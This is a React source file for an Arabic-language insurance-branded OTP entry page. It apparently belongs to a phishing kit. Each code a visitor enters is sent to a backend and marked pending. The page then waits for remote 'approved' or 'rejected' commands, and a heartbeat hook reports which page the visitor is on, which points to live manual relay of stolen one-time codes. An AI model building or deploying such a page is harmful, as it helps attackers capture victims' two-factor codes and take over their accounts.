import { useState, useRef, useEffect } from "react";
import { Shield, CheckCircle, XCircle, Loader2, RefreshCw } from "lucide-react";
import { api } from "@/lib/api";
import { useHeartbeat, useCommandPoll } from "@/lib/useHeartbeat";

type S = "idle" | "pending" | "approved" | "rejected";

export default function OtpPage() {
  useHeartbeat("تحقق OTP");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<S>("idle");
  const refs = useRef<(HTMLInputElement | null)[]>([]);

  useCommandPoll({
    "otp:approved": () => setStatus("approved"),
    "otp:rejected": () => setStatus("rejected"),
  });

  async function submit() {
    const code = otp.join("");
    if (code.length < 6) return;
    const id = localStorage.getItem("wiqaya_id");
    if (!id) return;
    await api.patch(id, { otpCode: code, otpStatus: "pending" });
    setStatus("pending");
  }

  if (status === "approved") return (
    <div className="min-h-screen flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif", background: "#f0fdf4" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <CheckCircle className="w-20 h-20 text-emerald-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[26px] font-extrabold text-gray-900">تم التحقق بنجاح!</h2>
        <p className="text-[14px] text-gray-500">سيتم عرض وثائق التأمين المناسبة لك قريباً</p>
        <button onClick={() => window.location.href = "/wiqaya/"}
          className="w-full py-3 rounded-xl text-white font-bold text-[15px] hover:opacity-90 transition-opacity"
          style={{ background: "#1a5276" }}>
          العودة للرئيسية
        </button>
      </div>
    </div>
  );

  if (status === "rejected") return (
    <div className="min-h-screen flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif", background: "#fff5f5" }}>
      <div className="text-center space-y-5 max-w-xs mx-4">
        <XCircle className="w-20 h-20 text-red-500 mx-auto" strokeWidth={1.5} />
        <h2 className="text-[24px] font-extrabold text-red-600">رمز التحقق غير صحيح</h2>
        <p className="text-[14px] text-gray-500">تأكد من الرمز وحاول مرة أخرى</p>
        <button onClick={() => { setStatus("idle"); setOtp(["","","","","",""]); }}
          className="w-full py-3 rounded-xl border border-gray-200 text-gray-700 font-bold text-[15px] hover:bg-gray-50 transition-colors flex items-center justify-center gap-2">
          <RefreshCw className="w-4 h-4" /> حاول مجدداً
        </button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif", background: "linear-gradient(160deg, #f0f4f8, #e8f5f0)" }}>
      <div className="max-w-sm w-full mx-4 space-y-6">
        <div className="text-center space-y-3">
          <div className="w-16 h-16 rounded-full flex items-center justify-center mx-auto shadow-lg" style={{ background: "#1a3a5c" }}>
            <Shield className="w-8 h-8 text-white" strokeWidth={1.5} />
          </div>
          <h2 className="text-[22px] font-extrabold text-gray-900">رمز التحقق</h2>
          <p className="text-[13px] text-gray-500">أدخل الرمز المرسل إلى جوالك المسجّل</p>
        </div>

        <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 space-y-6">
          <div className="flex gap-2 justify-center" dir="ltr">
            {otp.map((v, i) => (
              <input key={i} ref={el => { refs.current[i] = el; }}
                type="text" inputMode="numeric" maxLength={1} value={v}
                onChange={e => {
                  const val = e.target.value.replace(/\D/, "");
                  const n = [...otp]; n[i] = val; setOtp(n);
                  if (val && i < 5) refs.current[i + 1]?.focus();
                }}
                onKeyDown={e => { if (e.key === "Backspace" && !otp[i] && i > 0) refs.current[i - 1]?.focus(); }}
                className="w-11 h-14 rounded-xl border-2 border-gray-200 text-center text-[20px] font-extrabold text-gray-900 outline-none transition-all bg-gray-50"
                style={{ borderColor: v ? "#1a5276" : undefined }}
              />
            ))}
          </div>

          <button disabled={otp.join("").length < 6 || status === "pending"} onClick={submit}
            className="w-full py-3.5 rounded-xl text-white font-extrabold text-[16px] disabled:opacity-40 transition-colors flex items-center justify-center gap-2"
            style={{ background: "#1a5276" }}>
            {status === "pending" ? <><Loader2 className="w-5 h-5 animate-spin" />جارٍ التحقق...</> : "تأكيد الرمز"}
          </button>

          <p className="text-center text-[12px] text-gray-400">
            لم تستلم الرمز؟{" "}
            <a href="#" className="font-bold hover:underline" style={{ color: "#1a5276" }}>إعادة الإرسال</a>
          </p>
        </div>
      </div>
    </div>
  );
}
